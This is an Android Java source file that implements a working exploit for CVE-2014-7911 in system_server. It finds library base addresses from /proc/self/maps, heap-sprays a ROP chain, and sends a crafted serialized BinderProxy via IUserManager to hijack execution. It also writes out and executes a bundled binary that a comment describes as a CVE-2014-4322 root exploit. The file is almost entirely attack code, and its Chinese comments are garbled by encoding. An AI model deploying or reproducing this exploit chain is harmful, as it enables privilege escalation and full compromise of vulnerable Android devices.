package gene.blue.cve20147911exp;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;
import android.R.string;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.res.AssetManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Parcel;
import android.os.UserHandle;
import android.os.UserManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

public class MainActivity extends Activity {
	
	
	static int rop_chain[] = {0x0004ff14+1,0x000243cc+1,0x000863b4+1,0x000250e0+1};
	//                        gadget1:libandroid_runtime.so
	//                        gadget2:libc.so thumb mode,to do stack pivot
	//                        gadget3:libandroid_runtime.so  thumb mode,r0->cmd
	//                        gadget4:libc.so thumb mode,system call
	static int spray_buffer_lenth = 100000;  
	static int gadget_buffer_lenth = 0x60;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		Button b = (Button) findViewById(R.id.button1);
		
		b.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				ReleaseBin();
				
				String logInfo = ""; 
				
				int dalvikAddr = get_base("/dev/ashmem/dalvik-heap");
				int libcAddr = get_base("/system/lib/libc.so");
				int libAndroidRuntimeAddr = get_base("/system/lib/libandroid_runtime.so");
				
				Log.e("cve","exploiting.... dalvik_addr address 0x"+ Integer.toHexString(dalvikAddr));
			    Log.e("cve","exploiting.... libc_addr address 0x"+ Integer.toHexString(libcAddr));
			    Log.e("cve","exploiting.... libandroid_addr address 0x"+ Integer.toHexString(libAndroidRuntimeAddr));
			    logInfo += "dalvik_addr address 0x"+ Integer.toHexString(dalvikAddr)+"\n";
			    logInfo += "libc_addr address 0x"+ Integer.toHexString(libcAddr)+"\n";
			    logInfo += "libandroid_addr address 0x"+ Integer.toHexString(libAndroidRuntimeAddr)+"\n";
				
			    int static_address = dalvikAddr+0x01001000; //Ϊʲô���� 0x01001000 ��С��Զ���ѷ���Ķѣ�������С��Σ�
			    
			    Log.e("cve","exploiting.... static address 0x"+ Integer.toHexString(static_address));    
			    logInfo += "static address 0x"+ Integer.toHexString(static_address)+"\n";
			    
			    int gadget_buffer_offset = spray_buffer_lenth - gadget_buffer_lenth;   //String buffer����ʼλ�õ�Gadget buffer��ƫ��
                
                Log.e("cve","exploiting.... gadget buffer offset 0x"+ Integer.toHexString(gadget_buffer_offset));
                logInfo += "gadget buffer offset 0x"+ Integer.toHexString(gadget_buffer_offset)+"\n";
				
                //����spray chunk
                char[] chunk = new char[spray_buffer_lenth/2];   //char�Ĵ�СΪ�����ֽ�
                int value;
                for(int i=0;i<gadget_buffer_offset/2;i+=2){
                	value = static_address+gadget_buffer_offset-2*i;
                	chunk[i] = (char)value;
                	chunk[i+1] = (char)((value >>16) & 0xffff);
                }
                
                String cmd = "/data/data/gene.blue.cve20147911exp/e";
                int[] tempValue = string2Int(cmd);
                for(int i=0;i<tempValue.length;i++){
                    chunk[gadget_buffer_offset/2-2*22+i*2] = (char)tempValue[i];
                    chunk[gadget_buffer_offset/2-2*22+1+i*2] = (char)((tempValue[i] >>16) & 0xffff);
                }
                
                value = 1;
                chunk[gadget_buffer_offset/2-2] = (char)value;
                chunk[gadget_buffer_offset/2-2+1] = (char)((value >>16) & 0xffff);
                
                value = 0xdeadbeef;
                chunk[gadget_buffer_offset/2] = (char)value;
                chunk[gadget_buffer_offset/2+1] = (char)((value >>16) & 0xffff);
                
                
                value = static_address;
                chunk[gadget_buffer_offset/2+2*1] = (char)value;
                chunk[gadget_buffer_offset/2+2*1+1] = (char)((value >>16) & 0xffff);
                
                value = libAndroidRuntimeAddr + rop_chain[0]; //gadget1
                chunk[gadget_buffer_offset/2+2*3] = (char)value;
                chunk[gadget_buffer_offset/2+2*3+1] = (char)((value >>16) & 0xffff);
                
                value = libAndroidRuntimeAddr + rop_chain[2];  //gadget3
                chunk[gadget_buffer_offset/2+2*4] = (char)value;
                chunk[gadget_buffer_offset/2+2*4+1] = (char)((value >>16) & 0xffff);
                
                value = libcAddr + rop_chain[3];  //gadget4 
                chunk[gadget_buffer_offset/2+2*11] = (char)value;
                chunk[gadget_buffer_offset/2+2*11+1] = (char)((value >>16) & 0xffff);
                
                value = libcAddr + rop_chain[1];  //gadget2
                chunk[gadget_buffer_offset/2+2*21] = (char)value;
                chunk[gadget_buffer_offset/2+2*21+1] = (char)((value >>16) & 0xffff);
                
         	    
                //��log��Ϣд���ļ�
                String sdPath = Environment.getExternalStorageDirectory() + "/";  
        		File file = new File(sdPath+"7911log.txt");
        		if(!file.exists()){
        			try {
        				file.createNewFile();
        			} catch (IOException e) {
        				// TODO Auto-generated catch block
        				e.printStackTrace();
        			}
        		}
        		try {
					FileWriter fileWriter = new FileWriter(file,true);
					fileWriter.write(logInfo);
					fileWriter.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
         	    
         	   //heap spray 
               String chunkStr = String.valueOf(chunk);
               for(int i = 0;i<2000;i++){
            	   heapSpray(chunkStr);
               }
               
               expolit(static_address);
               
                
			}
		});
	}
	
	
	
	/**
	 * ͨ����ȡ�������ڴ沼�����õ�syste_server���ڴ沼��
	 * ԭ�򣺾�fork��zygote���̣�αASLR
	 * @param libname
	 * @return
	 */
	private int get_base(String libname){
		Scanner scanner = null;
		try{
			scanner = new Scanner(new File("/proc/self/maps"));
			while(scanner.hasNext()){
				String line = scanner.nextLine().trim();
				String[] fields = line.split("\\s+");   //�������ʽ
				
				// 0001d000-00024000 rw-p 00000000 00:00 0          [heap]
				if(fields != null && fields.length >=1){
					String addr = fields[0];   //0001d000-00024000
					if(fields.length >= 6){
						String tag = fields[5];
						if(libname.equals(tag)){
							String[] addrs = addr.split("-");
							int i = Integer.parseInt(addrs[0],16);
							return i;
						}
					}
				}
			}
		}catch (FileNotFoundException e){
			e.printStackTrace();
		}finally {
			if(scanner != null){
				scanner.close();
			}
		}
		return 0;
	}
	
	
	
	/**
	 * �ͷ�bin�ļ���bin�ļ�Ϊcve-2014-4322��exp��system->root
	 */
	private void ReleaseBin(){
		AssetManager aManager = getAssets();
		ApplicationInfo appInfo = this.getApplicationInfo();
		try {
			InputStream in = aManager.open("msmattack");
			boolean bSuscess = true;
			String path = getFilesDir().getPath();
			path = path.substring(0, path.lastIndexOf("/", path.length() - 1));

			File file = new File(path, "e");
			
			if (!file.exists())
				bSuscess = file.createNewFile();
				file.setExecutable(true, false);
			FileOutputStream out = new FileOutputStream(file);
			int c;
			byte buffer[] = new byte[1024];
			while ((c = in.read(buffer)) != -1) {
				for (int i = 0; i < c; i++)
					out.write(buffer[i]);
			}
			in.close();
			out.close();
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
	}

	/**
	 * �������ַ���ת����int��ʽ
	 * @return
	 */
	private int[] string2Int(String str){
		char[] chars = str.toCharArray();
        int[] values = new int[chars.length / 4 + (chars.length % 4 == 0 ? 0 : 1)];
        int i = 0;
        for (int idx = 0; idx < values.length; idx++) {
            while (i < chars.length) {
                values[idx] += chars[i] << (8 * (i % 4));
                i++;
                if (i % 4 == 0) {
                    break;
                }
            }
        }
        return values;
	}
	
	BroadcastReceiver receiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context arg0, Intent arg1) {
			// TODO Auto-generated method stub
		}
	};
	
	/**
	 * heap spray
	 * @param str
	 */
	private void heapSpray(String str){
		try {
			IntentFilter inFilter = new IntentFilter();
    		this.registerReceiver(receiver, inFilter,str,null);
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
	}
	
	private static final java.lang.String DESCRIPTOR = "android.os.IUserManager";
    private Class clStub;
    private Class clProxy;
    private int TRANSACTION_setApplicationRestrictions;
    private IBinder mRemote;
    
	@SuppressLint("NewApi")
	private void expolit(int static_address){
		Context ctx = getBaseContext();
		try {
			Bundle b = new Bundle();
            AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
            evilProxy.mOrgue = static_address ;
            b.putSerializable("eatthis", evilProxy);
            
            Class clIUserManager = Class.forName("android.os.IUserManager");
            Class[] umSubclasses = clIUserManager.getDeclaredClasses();
            System.out.println(umSubclasses.length+" inner classes found");
            Class clStub = null;
            for (Class c: umSubclasses) {
                    System.out.println("inner class: "+c.getCanonicalName());
                    if (c.getCanonicalName().equals("android.os.IUserManager.Stub")) {
                            clStub = c;
                    }
            }
            
            Field fTRANSACTION_setApplicationRestrictions =
                            clStub.getDeclaredField("TRANSACTION_setApplicationRestrictions");
            fTRANSACTION_setApplicationRestrictions.setAccessible(true);
            TRANSACTION_setApplicationRestrictions =
                    fTRANSACTION_setApplicationRestrictions.getInt(null);
    
            UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
            Field fService = UserManager.class.getDeclaredField("mService");
            fService.setAccessible(true);
            
            Object proxy = fService.get(um);
    
            Class[] stSubclasses = clStub.getDeclaredClasses();
            System.out.println(stSubclasses.length+" inner classes found");
            clProxy = null;
            for (Class c: stSubclasses) {
            	System.out.println("inner class: "+c.getCanonicalName());
            	if (c.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
            		clProxy = c;
            	}
            }
    
            Field fRemote = clProxy.getDeclaredField("mRemote");
            fRemote.setAccessible(true);
            mRemote = (IBinder) fRemote.get(proxy);

            UserHandle me = android.os.Process.myUserHandle();
            setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int 
			userHandle) throws android.os.RemoteException {
		android.os.Parcel _data = android.os.Parcel.obtain();
		android.os.Parcel _reply = android.os.Parcel.obtain();
		try {
			_data.writeInterfaceToken(DESCRIPTOR);
			_data.writeString(packageName);
			_data.writeInt(1);
			restrictions.writeToParcel(_data, 0);
			_data.writeInt(userHandle);
			
			byte[] data = _data.marshall();
			for (int i=0; true; i++) {
				if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
					data[i] = 'a';
					data[i+1] = 'n';
					break;
				}
			}
			_data.recycle();
			_data = Parcel.obtain();
			_data.unmarshall(data, 0, data.length);
			                    
			mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
			_reply.readException();
		}
		finally {
			_reply.recycle();
			_data.recycle();
		}
	}
	
	
}
